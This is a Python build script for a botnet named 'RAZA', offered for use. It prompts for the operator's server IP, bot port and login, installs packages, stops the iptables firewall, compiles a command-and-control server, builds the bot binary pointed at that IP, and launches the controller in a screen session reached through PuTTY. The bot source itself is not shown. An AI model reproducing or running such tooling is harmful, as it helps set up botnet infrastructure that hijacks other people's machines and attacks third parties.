#RAZA All You Need To Do is Put The IP in the bot_RAZA.c and set your botport it can be what ever your want
import sys
import time
import subprocess
import warnings
import fileinput

def run(cmd):
    subprocess.call(cmd, shell=True)
 
print ("\x1b[38;5;93m[+] Welcome to \x1b[1;36mRAZA \x1b[38;5;93m[+]")
print ("\x1b[38;5;93m[+] Load All \x1b[1;36mRAZA \x1b[38;5;93mFiles Into \x1b[1;36m/root/")
print ("\x1b[38;5;93m[+] Change IP and botport in bot_RAZA.c")
raw_input ("\x1b[38;5;93m[+] When All Files Are Loaded, Press Enter to Start Building...")

print ("\r\n\x1b[38;5;93m       RAZA - Auto-Build Process Initiated...\r\n")
time.sleep(2)

ip = raw_input("Enter Server IP:")
botport = raw_input("Enter Your Botport:") #make sure your bot port is the same as the one in the bot_RAZA.c
screenport = raw_input("Enter Your screenport:") #You can make the screen port what ever you want this is the port you use in putty
user = raw_input("Enter Your User Name:")
passwd = raw_input("Enter Your Password:")

print ("\x1b[38;5;93m[+] Installing Requirements...")

run("yum install python-paramiko nano screen gcc perl wget lbzip unzip -y")
print ("\x1b[1;36mDONE\x1b[38;5;93m Requirements Installed...")
time.sleep(2)

print ("\x1b[1;36m[+] Installing Compilers...\x1b[0m")
time.sleep(1)
run ("service httpd restart")
run("service iptables stop")
run("gcc cnc.c -o server -pthread")
print ("\x1b[1;36mDONE\x1b[38;5;93m Compilers Installed...")

print ("\x1b[38;5;93m[+] Compiling RAZA Bot...\x1b[0m")
time.sleep(2)

run("python RAZA.py bot_RAZA.c " + ip + " -y")


run("echo " + user + " " + passwd + " >>Login.txt")
raw_input ("[+] This Will Screen Your Server It Will Take You To a black screen just press CTRL+A+D")
raw_input("[+] If Nothing happens then just type screen ./server " + botport + " 1 " + screenport + "")

run("screen ./server " + botport + "1" + screenport + "") #Screens the the botnet to the screen port Now just press CTRL+A+D

print ("\x1b[38;5;93m[+] Thats It Now just open putty with RAW and use the screen port \x1b[38;5;93m[+]")
